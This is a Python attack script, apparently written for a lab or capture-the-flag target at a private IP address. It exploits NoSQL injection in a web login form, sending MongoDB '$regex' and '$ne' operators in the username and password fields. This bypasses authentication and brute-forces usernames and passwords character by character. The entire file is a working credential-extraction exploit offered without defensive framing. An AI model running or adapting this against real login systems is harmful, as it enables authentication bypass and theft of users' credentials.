import requests
import re
import string

alphabet = string.ascii_lowercase + string.digits
password_alphabet = string.printable

webapp = "http://192.168.38.200:80"

users = []

def test_username(username:str) -> bool:
  data = { "username[$regex]": f"^{username}$", "password[$ne]":"steps0x29a", "login": "login" } 
  x = requests.post(webapp, data, allow_redirects=False)
  return "Login succeeded" in x.text

def bruteforce_user(seed:str='') -> str:
  username = seed
  last = None
  max_tries = 200
  tries = 0
  while True and tries < max_tries:
    for a in alphabet:
      payload = f"{username}{re.escape(a)}"
      print(f"\r{payload}", flush=True, end='')
      data = { "username[$regex]": f"^{payload}.*$", "password[$ne]":"steps0x29a", "login": "login" } 
      x = requests.post(webapp, data, allow_redirects=False)
      if "Login succeeded" in x.text:
        username = f"{username}{a}"
        if last != username:
          last = username
          tries = 0
        else:
          tries += 1
        if test_username(username):
          # print()
          return username
        break
      else:
        tries += 1
  return None 

def test_password(username:str, password:str) -> bool:
  data = { "username[$regex]": f"^{username}$", "password[$regex]": f"^{password}$", "login": "login" } 
  x = requests.post(webapp, data, allow_redirects=False)
  return "Login succeeded" in x.text

def bruteforce_password(username, seed='') -> str:
  password = seed
 
  while True:
    for a in password_alphabet:
      payload = f"{password}{re.escape(a)}"
      print(f"\r{username}:{payload}", flush=True, end='')
      data = { "username": username, "password[$regex]":f"^{payload}", "login": "login" } 
      x = requests.post(webapp, data, allow_redirects=False)
      if "Login succeeded" in x.text:
        password = f"{password}{a}"
        if test_password(username, password):
          print()
          return password
        break

seeds = string.ascii_lowercase
# seeds = ['a']
for letter in seeds:
  user = bruteforce_user(letter)
  if user:
    # clear output line
    #print(f"\rFound user: {user}", flush=True, end='\n')
    bruteforce_password(user)
    users.append(user)
    # print(f'Username found: {user}')

print(f"\r               ", flush=True, end='')


# for user in users:
  # print(f"{user}:{bruteforce_password(user)}")
  # bruteforce_password(user)
